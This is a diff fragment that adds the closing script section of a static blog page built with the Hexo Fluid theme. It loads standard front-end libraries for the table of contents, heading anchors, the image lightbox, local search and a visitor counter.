+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
